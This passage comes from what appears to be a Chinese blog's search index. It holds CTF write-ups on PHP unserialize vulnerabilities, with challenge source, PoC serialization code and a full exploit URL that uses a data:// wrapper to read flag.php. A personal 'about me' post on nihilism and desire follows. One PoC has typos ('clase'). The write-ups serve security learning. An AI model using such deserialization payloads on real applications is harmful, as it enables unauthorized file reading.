class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">class FileHandler &#123;</span><br><span class="line"> </span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"> </span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"> </span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h2><ol><li>接受一个传参str，进行is_valid过滤(这个过滤的意思就只是确保str里没有32-125之外的字符，鉴于我们传的东西没有那些字符，所以可以直接略过)</li><li>反序列化<code>$</code>str，并赋值给<code>$</code>obj</li><li>类FileHandler有三个成员变量，在序列化里，protected没多大用的</li><li>FileHandler在创建对象的时候会执行<code>__construct</code>，销毁对象时执行<code>__destruct</code>，两个方法都会调用process方法</li><li>process方法会调用write或read方法，这两个方法里有敏感函数，一个读文件一个写文件，我们这次只需要读；然后会调用output将read的返回输出</li><li>如果要构造poc链，那里面的op要为2，filename要为我们想要读取文件的文件名，当然就是include包含的flag.php</li></ol><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public $op;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler(); // 虽然__construct方法会修改op和filename</span><br><span class="line">$a-&gt;op=2;</span><br><span class="line">$a-&gt;filename=&quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"><a href="#浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维" class="headerlink" title="浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维"></a>浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维</h2><h2 id="源码1"><a href="#源码1" class="headerlink" title="源码1"></a>源码1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里用到了伪协议的知识，这与我们这篇浅记的主题无关，况且这是浅浅一记<br>只需要知道，通过data:&#x2F;&#x2F;伪协议传text绕过welcome to the zjctf，再file传php伪协议的任意文件读取读useless.php内容的base64，然后解码就能得到useless.php源代码</p><h2 id="源码2"><a href="#源码2" class="headerlink" title="源码2"></a>源码2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><p>这里可以真读取任意文件了，毕竟源码1过滤了file</p><h2 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h2><ol><li><code>__tostring</code>在所在对象被当作字符串时发动</li><li>敏感函数读取$file文件，然后输出</li><li>由于源码1 echo了反序列化的$password——当作字符串输出，所以这里就是突破口</li></ol><h2 id="poc链"><a href="#poc链" class="headerlink" title="poc链"></a>poc链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;  </span><br><span class="line">    public $file;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传入一下url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ps:我想时常试用f12是一个好习惯</p><h2 id="2021-第五空间智能安全大赛-Web-pklovecloud"><a href="#2021-第五空间智能安全大赛-Web-pklovecloud" class="headerlink" title="2021-第五空间智能安全大赛-Web-pklovecloud"></a>2021-第五空间智能安全大赛-Web-pklovecloud</h2><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">class pkshow </span><br><span class="line">&#123;  </span><br><span class="line">    function echo_name()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;Pk very safe^.^&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;cinder))  </span><br><span class="line">            return $this-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">    function echo_name()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">        $this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;keystone lost~&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pks&#x27;]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[&#x27;pks&#x27;]);</span><br><span class="line">    echo $logData; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h2><ol><li>反序列化pks，赋值给logData，然后输出</li><li>pkshow类没什么好说的</li><li>acp会首先将cinder构建为pkshow对象，然后调用里面的echo_name输出，我们不想要这个</li><li>ace的echo_name会反序列化成员变量docker，然后赋值给openstack</li><li>比较openstack里面的neutron和nova，看看是否值和类型都相等</li><li>相等就根据$filename读取文件</li><li>如果openstack没有neutron和nova，那么必然相等，即——虚无和虚无是等价的。毕竟$heat的值是不知道的。这意味着根本不用管docker和openstack</li></ol><h2 id="poc链条"><a href="#poc链条" class="headerlink" title="poc链条"></a>poc链条</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ace&#123;</span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">&#125;</span><br><span class="line">clase acp&#123;</span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new acp();</span><br><span class="line">$a-&gt;cinder=new ace();</span><br><span class="line">$a-&gt;cinder-&gt;filename=&quot;flag.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>反序列化蛮好玩的，当然学的话那是真的头痛</li><li>解决反序列化题目有一下几个要点<ol><li>得到源代码</li><li>魔术方法</li></ol></li><li>得到源代码需要其他web渗透和ctf技能的辅助，我的基础不太牢靠，需要对一下这几个方面进行补足：<ol><li>xss</li><li>csrf</li><li>ssrf</li><li>伪协议</li><li>文件上传、读取、包含webshell</li><li>SQL注入</li><li>其他</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术 </tag>
            
            <tag> 浅记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello_and_call_me_lord</title>
      <link href="/2023/10/21/hello-and-call-me-lord/"/>
      <url>/2023/10/21/hello-and-call-me-lord/</url>
      
        <content type="html"><![CDATA[<h1 id="你好👋"><a href="#你好👋" class="headerlink" title="你好👋"></a>你好👋</h1><p><img src="/2023/10/21/hello-and-call-me-lord/%E8%BF%9C%E8%A7%86%E4%B8%BB%E4%B9%89%E6%97%97%E5%B8%9C.jpeg"></p><h2 id="关于我的名字和这个教会"><a href="#关于我的名字和这个教会" class="headerlink" title="关于我的名字和这个教会"></a>关于我的名字和这个教会</h2><p>我是truthleader，也可以叫我真理教教主</p><span id="more"></span><p>我本来给自己设计的网名就是真理教教主，但是truthleader听上去更朗朗上口</p><p>所以我用google翻译得到了truthleader，（很遗憾现在不是这样的翻法了）😭</p><p>这是一个教会的官方网站，但是注意，这是一个私人的教会，我的意识是教会成员只有一个人，我兼任教主、圣战委员会常务委员长、自我教育局局长······</p><p>总之，这个网站代表着我想要公之于众的自我内心世界，我的初心就是把我最真实的精神世界裸露出来，不论祂是否让人感到愉悦好玩、恶心厌恶————I don’t care a fuck</p><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>我学习的专业是信息安全，我将此看作我主要的经济来源，这是我的爱好</p><p>我喜欢学习：哲学的、社会学的、科学的、政治的、心理的、生物的、医学的、地理的、计算机或者安全相关的——一切都是我想学的</p><p>我希望别人对我的评价是：thinker</p><h3 id="我的观念"><a href="#我的观念" class="headerlink" title="我的观念"></a>我的观念</h3><p>我将虚无主义预设为前提：</p><ol><li>目的本身是没目的的</li><li>意义本身是没意义的</li><li>存在是虚无的，但其存在是一个奇迹</li><li>伦理道德是空虚之物</li><li>不能用虚无为自己消极的态度做辩护，两者根本不接轨，想自杀的人因此而无顾忌，乐观向上的人因此而无拘束的乐于助人追求进步</li><li>自杀是不对的，死亡是不对的，人的欲望不应把人摧毁，我的欲望不应把我摧毁，</li></ol><ul><li><p>所谓的“我”是头脑生出的幻想，我所认为的那个“我”并不存在，本真的“我”是虚无的，所谓的自我意识是欲望集合体的某一个组织——调配欲望的优先满足顺序、计划欲望满足的机器</p></li><li><p>我把“求知欲”认定为我，我将禁欲的欲望当作枪来压制游戏的欲望和性的欲望，一切互相制衡分出高低，我把自己看作一个欲望代言人，欲望都想当我</p></li><li><p>求知欲是唯一变革自我观念、自我能力、自我的动力，我因此而行动生活，我不认为我的观念是真的、有价值的、可信的</p></li><li><p>我因为学习和头脑训练得出观念，我视其为求知欲想认识自己</p></li><li><p>我将欲望看作是第一性的，因而以此为基础来看待世界</p></li><li><p>对我来说，欲望的对象是具体的人和事，但欲望的目的是自我再生产，欲望通过快感实现再生产</p></li><li><p>快感是让人有愧疚感、罪恶感、兴奋感的上瘾之物</p></li><li><p>欲望的停止就是世界的死去</p></li><li><p>一切都是欲望的产物，包括欲望，例如：时间在前进、世界在涌现、现在带着过去奔向未来、有着“定律”的未来在把现实和过去牵引、资本为了再生产而支取肉身、变革者为了福祉、平等、幸福、理想而不断的前进、福祉本身的标准越来越高、科学越来越复杂强大、抖音越刷越想刷、游戏越玩越想玩</p></li><li><p>人不应该在欲望上让步，要不顾一切的让自己的欲望不断的再生产——保持生存、避免危险、享用美食、求取知识、爱另一半、尊老爱幼、尊敬师长、服从规矩</p></li><li><p>但欲望之间是互相冲突的，例如：想吃饭同时又想五谷轮回，总要先五谷轮回才能吃好饭，你是否想在五谷轮回的时候吃饭呢？有了一门赚钱的方式，但这触碰了良心，只有先检查良心去伪存真，然后才知道到底要不要这么做？</p></li><li><p>我只捍卫自己的欲望，别人怎么样与我无关，除非有欲望的牵扯，除非长远来看我真的确实就应该服软</p></li><li><p>罪犯有犯罪的能力，共同体的代表有抓捕的权利和义务</p></li></ul><h1 id="关于这个网站和未来的展望"><a href="#关于这个网站和未来的展望" class="headerlink" title="关于这个网站和未来的展望"></a>关于这个网站和未来的展望</h1><h2 id="我必须承认，我什么都没准备好："><a href="#我必须承认，我什么都没准备好：" class="headerlink" title="我必须承认，我什么都没准备好："></a>我必须承认，我什么都没准备好：</h2><ol><li>我没有关于这个网站的一个准确的定位，我不知道这个博客到底有什么价值——能让我使用时间去构筑和维护</li><li>我没有设计这个网站的标签系统和分类系统，我想在博文的数量多一点之后再分类和贴标签</li><li>我认为这个网站的美术和外观都是一坨💩，这个网站堪堪一用就被我上传上来了（说不定以后会改善，我可能会钻研css和js，我也可能会在github上找我喜欢的代码用到这里来）</li></ol><h2 id="同时我也要对自己争辩，这个网站还是很不错的："><a href="#同时我也要对自己争辩，这个网站还是很不错的：" class="headerlink" title="同时我也要对自己争辩，这个网站还是很不错的："></a>同时我也要对自己争辩，这个网站还是很不错的：</h2><ol><li>我能通过这个来展示自己的能力，以后甚至可以写简介里</li><li>我可以通过这个网站来吸引一些同好来交流，我将因此而得到提升</li><li>我将通过对这个网站灌注心血来反向提升自我</li></ol><h2 id="然后，你可能会好奇，我会写些什么："><a href="#然后，你可能会好奇，我会写些什么：" class="headerlink" title="然后，你可能会好奇，我会写些什么："></a>然后，你可能会好奇，我会写些什么：</h2><ol><li>CTF题目的writeup</li><li>靶机的writeup</li><li>漏洞的技术文档或学习笔记</li><li>对安全事件的技术性反思</li><li>对我的观念的阐述</li><li>网安甚至其他内容的学习笔记</li><li>读书笔记</li></ol><h2 id="我希望这个网站："><a href="#我希望这个网站：" class="headerlink" title="我希望这个网站："></a>我希望这个网站：</h2><ol><li>能越来越有名气</li><li>外观和美术越来越好看</li><li>每个人能从中获益，从而找到好友</li><li>能给我的就业和真实生活带了进步</li><li>有一个完善的标签和分类体系</li></ol>]]></content>
      
      
      <categories>
          
          <category> About </category>
          
      </categories>
      
      
        <tags>
            
            <tag> me </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
